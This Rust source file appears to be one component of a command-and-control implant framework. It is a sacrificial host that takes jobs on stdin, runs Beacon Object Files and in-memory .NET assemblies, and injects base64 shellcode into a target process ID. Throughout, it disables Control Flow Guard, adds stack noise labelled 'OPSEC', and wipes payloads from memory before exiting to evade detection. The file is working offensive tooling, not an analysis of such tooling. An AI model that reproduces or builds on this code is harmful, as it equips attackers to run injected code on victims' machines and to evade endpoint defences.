//! Isolated execution host — runs BOF / .NET in **this** process only, then exits.
//!
//! Wire protocol on stdin (binary):
//!   magic [4]  — build-seed derived (see wire_ids::JOB_MAGIC; was legacy "CIS1")
//!   kind  u32le  (1=bof, 2=dotnet)
//!   pay_len u32le
//!   arg_len u32le
//!   payload[pay_len]
//!   args[arg_len]
//!
//! stdout: out_len + err_len + bodies. No C2 network.

#![windows_subsystem = "windows"]

use std::io::{Read, Write};

const KIND_BOF: u32 = 1;
const KIND_DOTNET: u32 = 2;
/// Inject job: payload = UTF-8 JSON {pid,data,method,wait_ms} — runs only in this host PE.
const KIND_INJECT: u32 = 3;

fn main() {
    #[cfg(windows)]
    disable_cfg_for_host();
    let _ = std::panic::catch_unwind(|| {
        if let Err(e) = run() {
            let _ = write_result(b"", e.as_bytes());
        }
    });
}

/// Best-effort: relax CFG so BOF/JIT code can run in this sacrificial host.
#[cfg(windows)]
fn disable_cfg_for_host() {
    // ProcessMitigationPolicy for Control Flow Guard — soft-fail if API missing
    type SetProcessMitigationPolicyFn = unsafe extern "system" fn(u32, *const u8, usize) -> i32;
    unsafe {
        let k32 =
            winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
        if k32.is_null() {
            return;
        }
        let p = winapi::um::libloaderapi::GetProcAddress(
            k32,
            b"SetProcessMitigationPolicy\0".as_ptr() as *const i8,
        );
        if p.is_null() {
            return;
        }
        let f: SetProcessMitigationPolicyFn = std::mem::transmute(p);
        // ProcessControlFlowGuardPolicy = 7; leave disabled flags zeroed
        let mut policy = [0u8; 16];
        let _ = f(7, policy.as_ptr(), policy.len());
    }
}

fn run() -> Result<(), String> {
    let mut stdin = std::io::stdin();
    let mut hdr = [0u8; 16];
    stdin
        .read_exact(&mut hdr)
        .map_err(|e| format!("read hdr: {e}"))?;
    if &hdr[0..4] != cupcake_core::wire_ids::JOB_MAGIC.as_slice() {
        return Err("bad job header".into());
    }
    let kind = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);
    let pay_len = u32::from_le_bytes([hdr[8], hdr[9], hdr[10], hdr[11]]) as usize;
    let arg_len = u32::from_le_bytes([hdr[12], hdr[13], hdr[14], hdr[15]]) as usize;
    if pay_len > 64 * 1024 * 1024 || arg_len > 4 * 1024 * 1024 {
        return Err("size limit".into());
    }
    let mut payload = vec![0u8; pay_len];
    if pay_len > 0 {
        stdin
            .read_exact(&mut payload)
            .map_err(|e| format!("read pay: {e}"))?;
    }
    let mut args_raw = vec![0u8; arg_len];
    if arg_len > 0 {
        stdin
            .read_exact(&mut args_raw)
            .map_err(|e| format!("read args: {e}"))?;
    }

    // OPSEC: tiny jitter
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        cupcake_core::stealth::stack::add_stack_noise();
    }

    let (stdout, stderr) = match kind {
        KIND_BOF => {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .map_err(|e| e.to_string())?;
            match rt.block_on(async {
                cupcake_core::loader::bof::BofLoader::execute(&payload, &args_raw).await
            }) {
                Ok(o) => (o, String::new()),
                Err(e) => (String::new(), format!("bof: {e}")),
            }
        }
        KIND_DOTNET => {
            let args: Vec<String> = if args_raw.is_empty() {
                Vec::new()
            } else if let Ok(v) = serde_json::from_slice::<Vec<String>>(&args_raw) {
                v
            } else {
                String::from_utf8_lossy(&args_raw)
                    .split_whitespace()
                    .map(|s| s.to_string())
                    .collect()
            };
            let domain = format!(
                "App_{:x}",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_nanos() as u32)
                    .unwrap_or(0)
            );
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .map_err(|e| e.to_string())?;
            let r = rt.block_on(async {
                cupcake_core::dotnet::DotNetExecutor::execute_assembly(
                    payload.clone(),
                    args,
                    Some(&domain),
                )
                .await
            });
            (r.stdout, r.stderr)
        }
        KIND_INJECT => {
            // JSON inject request — must not run in Stage0; this sacrificial host only.
            match run_inject_job(&payload) {
                Ok(msg) => (msg, String::new()),
                Err(e) => (String::new(), e),
            }
        }
        _ => (String::new(), format!("unknown kind {kind}")),
    };

    // Burn payload in this process before exit
    for b in payload.iter_mut() {
        *b = 0;
    }
    for b in args_raw.iter_mut() {
        *b = 0;
    }

    write_result(stdout.as_bytes(), stderr.as_bytes())
}

fn run_inject_job(body: &[u8]) -> Result<String, String> {
    #[cfg(windows)]
    {
        use base64::Engine;
        let v: serde_json::Value =
            serde_json::from_slice(body).map_err(|e| format!("inject json: {e}"))?;
        let pid = v.get("pid").and_then(|x| x.as_u64()).ok_or("missing pid")? as u32;
        let data_b64 = v
            .get("data")
            .and_then(|x| x.as_str())
            .ok_or("missing data")?;
        let method = v.get("method").and_then(|x| x.as_str()).unwrap_or("auto");
        let wait_ms = v.get("wait_ms").and_then(|x| x.as_u64()).unwrap_or(0) as u32;
        let mut sc = base64::engine::general_purpose::STANDARD
            .decode(data_b64.trim())
            .map_err(|e| format!("b64: {e}"))?;
        let result = cupcake_core::inject_shellcode(pid, &sc, method);
        for b in sc.iter_mut() {
            *b = 0;
        }
        match result {
            Ok(r) => {
                if wait_ms > 0 {
                    let _ = cupcake_core::wait_inject_thread(r.thread_handle, wait_ms);
                } else {
                    let _ = cupcake_core::wait_inject_thread(r.thread_handle, 0);
                }
                Ok(format!(
                    "injected pid={} addr=0x{:x} method={}",
                    r.pid, r.remote_addr, r.method
                ))
            }
            Err(e) => Err(format!("inject: {e}")),
        }
    }
    #[cfg(not(windows))]
    {
        let _ = body;
        Err("inject: windows only".into())
    }
}

fn write_result(stdout: &[u8], stderr: &[u8]) -> Result<(), String> {
    let mut out = std::io::stdout();
    let ol = (stdout.len() as u32).to_le_bytes();
    let el = (stderr.len() as u32).to_le_bytes();
    out.write_all(&ol).map_err(|e| e.to_string())?;
    out.write_all(&el).map_err(|e| e.to_string())?;
    out.write_all(stdout).map_err(|e| e.to_string())?;
    out.write_all(stderr).map_err(|e| e.to_string())?;
    out.flush().map_err(|e| e.to_string())?;
    Ok(())
}
